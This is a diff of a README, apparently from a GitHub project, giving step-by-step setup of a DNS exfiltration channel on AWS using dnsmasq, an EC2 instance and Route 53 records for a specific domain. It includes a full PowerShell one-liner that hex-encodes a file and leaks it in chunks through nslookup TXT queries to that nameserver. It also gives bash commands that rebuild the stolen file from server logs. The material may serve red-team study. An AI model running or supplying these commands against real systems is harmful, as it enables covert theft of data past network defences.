@@ -5,13 +5,14 @@ DNS Exfiltration Setup on AWS
 Verify your email!
 
 ## Step 2: Create EC2 instance to host DNS service and logging
-Logging will contain DNS requests with encoded information
+Use Amazon Linux OS, or any Linux OS of your preference.
+Logging will contain DNS requests with encoded information, which we can then grep and cut later.
 
 ## Step 3: Create Security Groups
 Inbound - Allow ICMP, TCP DNS, UDP DNS, SSH  
 Outbound - Any  
 
-## Step 4: Install dnsmasq and configure it
+## Step 4: Install dnsmasq on EC2 instance and configure it
 sudo yum install dnsmasq  
 sudo nano /etc/dnsmasq.conf then input the content below, right at the bottom of the config file  
   
@@ -24,7 +25,7 @@ Restart the VM, or find a way to restart dnsmasq (sudo systemctl restart systemd
 
 sudo dnsmasq  
 
-## Step 5: Note down default SOA and NS records, then remove them
+## Step 5: Go to Route 53 config, note down default SOA and NS records
 **Record Name:** bhealthen.com  
 **Type:** SOA  
 **Value:** ns-1714.awsdns-22.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400  
@@ -52,7 +53,7 @@ ns-113.awsdns-14.com.
 **Value:** 54.179.112.60
 **TTL:** 300  
 
-## Step 7: Modify existing NS Record to point to your EC2 instance
+## Step 7: Modify existing NS Record to point to your NS records, which point to your EC2 instance
 **Record Name:** bhealthen.com  
 **Type:** NS  
 **Value:**  
@@ -60,7 +61,7 @@ ns1.bhealthen.com
 ns2.bhealthen.com  
 **TTL:** 60  
 
-## Step 8: Modify existing SOA record to point to your EC2 instance
+## Step 8: Modify existing SOA record to point to your NS record, which points to your EC2 instance
 **Record Name:** bhealthen.com  
 **Type:** SOA  
 **Value:** ns1.bhealthen.com. admin.bhealthen.com 1 7200 900 1209600 86400  
@@ -80,15 +81,15 @@ sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"
 
 ## Step 11: Powershell command to hex encode a file, split, and do nslookup IMPROVEMENT POINT TO REMOVE encoded.hex
 
-certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5}  
+`certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5} `
 
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/17905ffc-ee42-4f8d-b801-7f837d3da555)
 
 
 ## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 
-sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output
-sudo cat output | xxd -p -r > SecretFile.txt | cat SecretFile.txt
+`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
+`sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  
 
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/68856338-b515-43e4-a873-d86df3ca9b27)
 
